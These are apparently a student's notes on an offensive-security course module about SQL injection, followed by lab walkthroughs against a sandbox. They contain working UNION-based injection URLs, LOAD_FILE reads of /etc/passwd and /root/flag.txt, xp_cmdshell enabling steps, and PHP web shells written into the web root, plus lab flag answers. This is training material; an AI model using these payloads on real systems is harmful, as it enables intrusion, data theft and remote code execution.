In MySQL, we can read files using theÂ _LOAD_FILE()_Â function. However, there is a catch. MySQL has aÂ _secure_file_priv_[3](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/reading-and-writing-files-31047#fn-local_id_78-3)Â system variable that restricts which directories can be used to read or write files. Some versions of MySQL do not set this variable by default, which means MySQL can potentially read or write any file (subject to OS file permissions). Setting the value to an empty string ("") is the same as leaving the value blank. Other versions, or hardened configurations, will set this variable to a specific directory. We can check the value of this variable withÂ `SELECT @@GLOBAL.secure_file_priv;`.

Verifying the secure_file_priv variable is set in our sandbox application
![[Pasted image 20240821223012.png]]

SinceÂ _secure_file_priv_Â is enabled (set to a non-null value) in our sandbox application, we will be restricted to reading and writing files inÂ `/var/lib/mysql-files`. This will prevent us from writing to the web root but we can still practice writing and reading files. Since we don't know what files will be in the writable directory, we'll first write a file there and then read it.

We can write a file with a SELECT statement ending withÂ _INTO OUTFILE 'file'_. The file location must be writable to the OS user the database software is running as. These different levels of permissions can be somewhat complicated, resulting in some database administrators opening permissions on the directory. Such misconfigurations may work to our advantage in some situations.

Let's try it out by writing the contents of the user table. We'll enterÂ `SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'`Â in the Query field, set "MySQL" as the database, and clickÂ _Submit Query_.

Writing a file using MySQL INTO OUTFILE
![[Pasted image 20240821224515.png]]

Writing a file in this way does not return any results. We also did not receive an error so we'll need to use another query to verify if the database created the file.

Let's try using theÂ _LOAD_FILE()_Â function to read the file we just created. We can use the function with a SELECT statement and pass in the file we want to read, including the full file path. We'll enterÂ `SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')`Â in the Query field, leave the Database set to "MySQL", and clickÂ _Submit Query_.

Reading a file using MySQL LOAD_FILE()
![[Pasted image 20240821224620.png]]

We were able to read back the file we created. If we attempt to read a file outside of the permitted directory whileÂ _secure_file_priv_Â is enabled, the database will return a null value.

Reading files is useful, especially for data gathering and exfiltration. As attackers, the ability to write files remotely may seem more appealing but its usefulness depends on the application and database architecture. If the application and database are running on the same server, we could potentially write a file to the web root and access it remotely. In some cases, this can lead to remote code execution if the created file is interpreted or executed by the server.

If the database software is running on a separate server, we could still write a file but we would need a way to interact with it. We will discuss some ways we might be able to do this, depending on the underlying database software, in the next section.

Go toÂ `http://sql-sandbox/sqlconsole`Â for the following exercises.


(Wikipedia, 2021),Â [https://en.wikipedia.org/wiki/Web_shell](https://en.wikipedia.org/wiki/Web_shell)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/reading-and-writing-files-31047#fnref-local_id_78-1)
(The PostgreSQL Global Development Group, 2021),Â [https://www.postgresql.org/docs/13/sql-copy.html](https://www.postgresql.org/docs/13/sql-copy.html)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/reading-and-writing-files-31047#fnref-local_id_78-2)
(Oracle, 2021),Â [https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/reading-and-writing-files-31047#fnref-local_id_78-3)


##### Labs

1. `OS{databasesAreMoreThanJustFiles}`
![[Pasted image 20240821225133.png]]
reading the file `/tmp/flag.txt`
```sql
SELECT pg_read_file('/tmp/flag.txt')
```
![[Pasted image 20240821224920.png]]

1. `OS{readingIsFUNdamental}`
![[Pasted image 20240821225440.png]]
```sql
SELECT LOAD_FILE('/var/lib/mysql-files/flag.txt')
```
![[Pasted image 20240821225514.png]]


-----------------

#### 8.3.5 Remote Code Execution

Some database software can directly call operating system commands. Usually, these features are either disabled by default, or restricted to administrative users. If we are able to access one of these functions through SQL injection, we should be able to obtain remote code execution on the underlying server.

In Microsoft SQL Server, theÂ _xp_cmdshell_[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/remote-code-execution-31048#fn-local_id_135-1)Â function takes a string and passes it to a command shell for execution. The function returns any output as rows of text. This function is disabled by default. If the function is enabled, it must be called with theÂ _EXECUTE_Â keyword instead ofÂ _SELECT_. For this reason, we usually need the ability to exploit stacked queries to useÂ _xp_cmdshell_Â in a SQL injection payload unless we can specify the entire SQL command.

If our database user has the appropriate permissions, we can enableÂ _xp_cmdshell_Â using these commands from Microsoft's documentation.[2](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/remote-code-execution-31048#fn-local_id_135-2)


Commands to enable xp_cmdshell()
```sql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO
```
OnceÂ _xp_cmdshell_Â is enabled, we can call it using the following syntax:
```sql
EXECUTE xp_cmdshell 'command to run here';
```

Note that the command is not enclosed by parentheses. The command is run in a shell with the same permissions as the SQL Server service account. While SQL Server is often run on Windows Servers, it can also be run on Linux. However, the Linux version of SQL Server does not support several functions, includingÂ _xp_cmdshell_. As with most attack techniques, we need to perform proper enumeration to understand our target before deciding on a specific SQL injection technique or payload.

(Microsoft, 2021),Â [https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/remote-code-execution-31048#fnref-local_id_135-1)
(Microsoft, 2021),Â [https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)Â [â†©ï¸Ž](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/remote-code-execution-31048#fnref-local_id_135-2)


----------------

#### 8.3.6 Extra Miles

Go toÂ `http://sql-sandbox/extramile/`Â for the following extra mile challenges.

1. `OS{extraMileSecretTableFlag}`
![[Pasted image 20240822125213.png]]
Starting point
![[Pasted image 20240822121310.png]]
inserting `'` and submitting into the message field
![[Pasted image 20240822121410.png]]
refreshing the page now shows `'` as well as `id=8`
![[Pasted image 20240822121503.png]]
throwing a `'` into the `id=` parameter shows `fetch_all` and `mysqli` - potentially `mysql` being used
![[Pasted image 20240822121742.png]]
so the query being utilized is `http://sql-sandbox/extramile/index.php?id=2 OR 1=1--` which gets converted to url encoding
this shows all the fields

Might look something like this
`SELECT id, message, price FROM menu WHERE id =`
![[Pasted image 20240822122518.png]]
command utilized to grab the `table` names from the current `database`
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()--
```
![[Pasted image 20240822124417.png]]
command utilized to grab the `column` names from the current `database`
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT NULL, column_name from information_schema.columns where table_schema = database() and table_name = 'flags'--
```
![[Pasted image 20240822124507.png]]
Grabbing the flag
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, flag from flags--
```
![[Pasted image 20240822124659.png]]

2. `OS{extraMileServerFlag}`
![[Pasted image 20240822153515.png]]
Checking to see if `secure_file_priv` is enabled, if it is enabled we are unable to write in certain places
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, @@GLOBAL.secure_file_priv--
```
nothing got returned so I believe we can write anywhere
![[Pasted image 20240822130432.png]]
going to work to try to write to `/var/lib/mysql-files`
Getting current user
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, current_user()--
```
![[Pasted image 20240822131254.png]]
Getting version
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, version()--
```
10.3.29-mariadb
![[Pasted image 20240822131423.png]]
going back to check out the `notes` table
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT NULL, column_name from information_schema.columns where table_schema = database() and table_name = 'notes'--
```
![[Pasted image 20240822131656.png]]
checking out `message` column
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT NULL, column_name from information_schema.columns where table_schema = database() and table_name = 'message'--
```
nothing.
![[Pasted image 20240822131727.png]]
this worked - just didnt catch it
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shelly.php';
```
![[Pasted image 20240822153158.png]]
testing to see if the current user has file writing privileges
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'--
```
This will attempt to find out if the current user has `FILE` privileges. If the query returns a result, it indicates that the user can write files.
![[Pasted image 20240822142010.png]]
Now how do I get a web shell?
`LOAD_FILE()` allows us to read the `/root/flag.txt` with a `UNION` statement but we need to figure out how to get a web shell to do the same thing
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, LOAD_FILE('/root/flag.txt')
```
`OS{extraMileServerFlag}`
![[Pasted image 20240822144139.png]]
Now we just need to find paths that exist and are writeable
loads `/etc/passwd` contents
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, LOAD_FILE('/etc/passwd')
```
![[Pasted image 20240822145516.png]]
Loading and copying `/etc/passwd` into `/tmp/test2.txt`
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/test2.txt'
```
Displays an error like it didnt work
![[Pasted image 20240822150350.png]]
Checking to see if `/tmp/test2.txt` got the `/etc/passwd` information
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, LOAD_FILE('/tmp/test2.txt')
```
But it did work
![[Pasted image 20240822150417.png]]
Placing a web shell with `'<?php exec($_GET["cmd"]); ?>'` into the web root `/var/www/html/shell.php`
```sql
http://sql-sandbox/extramile/index.php?id=2 UNION SELECT 1, '<?php exec($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```
![[Pasted image 20240822153403.png]]
Testing on the browser with `ls` command
```bash
http://sql-sandbox/extramile/shell.php?cmd=ls
```
able to see the directory contents
![[Pasted image 20240822152754.png]]
Grabbing the `/root/flag.txt` contents
```bash
http://sql-sandbox/extramile/shell.php?cmd=cat%20/root/flag.txt
```
![[Pasted image 20240822152852.png]]